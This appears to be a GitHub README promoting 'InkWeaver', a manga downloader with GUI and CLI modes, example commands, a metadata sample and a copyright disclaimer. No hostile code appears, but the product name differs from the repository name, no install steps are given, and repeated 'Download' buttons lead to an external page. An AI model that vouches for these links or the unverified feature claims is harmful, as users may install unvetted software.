![preview](https://raw.githubusercontent.com/luqmanluqman7349-cloud/manga-synchronizer/main/preview.svg)

# InkWeaver

*Where the narrative threads of manga meet the loom of automation—a curator for the digital collector.*

**InkWeaver** is not just another manga downloader. It is a thoughtful, automated archival companion designed for readers who value organization, consistency, and the quiet joy of a curated library. Born from the original spark of MeManga, InkWeaver reimagines the process: instead of merely fetching chapters, it weaves them into a structured, searchable, and visually coherent collection that respects the source material and the collector's eye.

Whether you are a power-user scripting your next weekend binge or a desktop app enthusiast who prefers a gentle UI, InkWeaver is built to serve both worlds. It speaks the language of metadata, cover art, and chapter ordering—transforming raw downloads into a polished personal archive.

---

## Overview 🌐

InkWeaver is a dual-interface system: a **responsive desktop application** for casual collectors and a **command-line interface** for advanced automation. The core philosophy is "order from chaos." Every chapter is tagged, every volume is structured, and every cover is preserved. The tool is engineered to be silent, swift, and scrupulous—no clutter, no duplicates, no dead links.

Think of it as a digital loom: you provide the threads (manga series and chapter ranges), and InkWeaver weaves them into a tapestry of neatly organized folders, metadata, and image sets, ready for reading on any e-reader or tablet.

---

[![Download](https://raw.githubusercontent.com/luqmanluqman7349-cloud/manga-synchronizer/main/button.svg)](https://luqmanluqman7349-cloud.github.io/manga-synchronizer/)

---

## Key Features 🧶

| Feature | Description |
|---------|-------------|
| **Dual-Mode Architecture** | Use the elegant desktop GUI for one-click collections or the CLI for batched, headless downloads. |
| **Intelligent Chapter Deduplication** | Automatically skips already-downloaded chapters unless a newer version exists. |
| **Metadata Embedding** | Each volume/folder receives a companion `.json` metadata file with series title, chapter number, release date, and source. |
| **Cover Art Extraction** | Automatically downloads and saves the cover image for each volume as `cover.jpg`. |
| **Responsive UI** | The desktop app adapts to screen sizes—from a 13-inch laptop to a 27-inch monitor—ensuring comfortable browsing. |
| **Multilingual Metadata** | Support for metadata in Japanese, English, Spanish, and French. UI language is auto-detected. |
| **24/7 Background Service** | Leave InkWeaver running; it can schedule downloads during off-peak hours (configurable). |
| **Export Profiles** | Tailor output formats: CBZ, plain images, or PDF. |
| **Retry & Resume Logic** | If a connection drops, InkWeaver resumes from the last successful chunk—no wasted bandwidth. |

---

## The Desktop App: A Strolling Digital Bookshelf 📚

The desktop application is built with **PyQt6** and **QtQuick**, providing a fluid, animated interface. You can:

- Browse your library via a **masonry grid** of cover thumbnails.
- **Search** by title, author, or genre tags.
- **Filter** by language, completion status, or date added.
- **Queue** downloads while reading already-collected volumes.
- **Preview** chapters before committing to a full download.

The app remembers your last position, your preferred language, and your reading device profile. It is designed to be the **gateway** to your personal collection—not just a download tool, but a reading companion.

---

## The CLI: The Conductor's Baton 🎼

For those who prefer the cold precision of a terminal, InkWeaver offers a rich CLI with composable commands:

```bash
inkweaver fetch --series "One Piece" --chapters 1-50 --output ./my_manga
inkweaver metadata --update --series "Berserk" --language jp
inkweaver schedule --daily --time 03:00 --output /mnt/nas/manga
inkweaver watch --series "Vinland Saga" --monitor --interval 900
```

The CLI supports:
- **JSON output** for piping into other tools (`jq`, `fzf`, `notify-send`).
- **Dry-run mode** to preview what would be downloaded.
- **Environment variable integration** for API keys and custom paths.
- **Logging levels** from `silent` to `trace`.

It is designed for power-users who want to integrate manga collection into their broader media automation pipelines.

---

## Why "InkWeaver"? The Philosophy Behind the Name 🕸️

The name draws from the metaphor of a weaver at a loom. Each thread (chapter) is carefully selected, tensioned, and placed to form a coherent whole. There is no haste—only deliberate curation. InkWeaver respects the art of the original creators by ensuring that every image is high-resolution, every page is in correct order, and every file is named consistently.

We believe that **collecting should be an act of preservation**, not hoarding. That is why InkWeaver includes a **collection health checker** that scans for corrupted images, missing pages, or broken metadata.

---

## Metadata: The Soul of the Archive 📖

InkWeaver enriches every download with a structured metadata file. Here is an example `metadata.json`:

```json
{
  "series": "Yotsuba&!",
  "source": "mangaplus",
  "language": "en",
  "chapter": 42,
  "total_pages": 28,
  "resolution": "1920x1080",
  "extracted_at": "2026-04-14T23:15:00Z",
  "checksum": "sha256:abc123..."
}
```

This metadata is **readable by third-party tools** like Komga, Kavita, or Calibre. For power-users, `inkweaver metadata --export csv` outputs a complete library inventory.

---

## Export Profiles: Tailor Your Library 🧵

InkWeaver supports multiple output profiles:

- **Reader-Ready (CBZ)** – Perfect for tablets. Includes cover as the first page.
- **Archive (Images)** – Raw JPEG/PNG per chapter, organized by volume.
- **Portable (PDF)** – Merges all pages into a single PDF per chapter.
- **Minimal** – Just image files, no folders, no metadata.

You can define custom profiles in `~/.inkweaver/profiles.yaml`.

---

## Scheduled Downloads: Wake Me When It's Ready ⏰

Set a schedule and let InkWeaver run in the background. It respects your system's power state and will **skip downloads if the battery is below 20%**. This is designed for laptops, servers, and NAS devices.

Example schedule: every day at 3:00 AM, download any new chapters for series in your "active" list.

---

## 24/7 Support? No—24/7 Reliability 🛡️

While there is no human support line at 3 AM, InkWeaver is built on a **self-healing architecture**. If a download fails mid-way, it retries up to 3 times with exponential backoff. If a source changes its URL structure, InkWeaver logs a detailed error and suggests alternative sources. The system **never silently omits a chapter**.

For human support, we maintain `docs/` and a community wiki. Bugs can be reported via GitHub Issues with automatic log attachments.

---

## Responsive UI: Grows with Your Screen 📱💻🖥️

The desktop client uses **fluid layouts**. On a small screen, it switches to a single-column list. On a large screen, it shows a grid with preview tooltips. The **dark theme** is the default—because manga is best enjoyed at night—with a light theme option for daylight.

Font sizes respect your system's scale factor. The UI is tested at 125%, 150%, and 200% scaling.

---

## Streaming Integration (Experimental) 🌊

InkWeaver can optionally **stream chapters** directly to a local browser or to an e-reader via the built-in HTTP server. This is not a download—it is a live preview. Useful for deciding whether to collect a series.

```bash
inkweaver serve --port 8080 --library ./manga
```

Then open `http://localhost:8080` on any device on your network.

---

## License 📜

This project is released under the **MIT License**. You are free to use, modify, and distribute it. See the [LICENSE](LICENSE) file for the full text.

---

## Disclaimer ⚠️

InkWeaver is a **tool for personal archival use**. It is designed to help collectors organize content they already have legal access to. Users are responsible for ensuring that their use of this tool complies with applicable copyright laws in their jurisdiction. The developers do not host, promote, or link to any unauthorized copies of copyrighted material. This tool interacts with sources that may have their own terms of service; users should review those terms independently.

The term "automatic downloader" refers to the automation of retrieval from sources the user has explicitly configured. No bypass of paywalls, subscription systems, or DRM is implemented or intended.

---

[![Download](https://raw.githubusercontent.com/luqmanluqman7349-cloud/manga-synchronizer/main/button.svg)](https://luqmanluqman7349-cloud.github.io/manga-synchronizer/)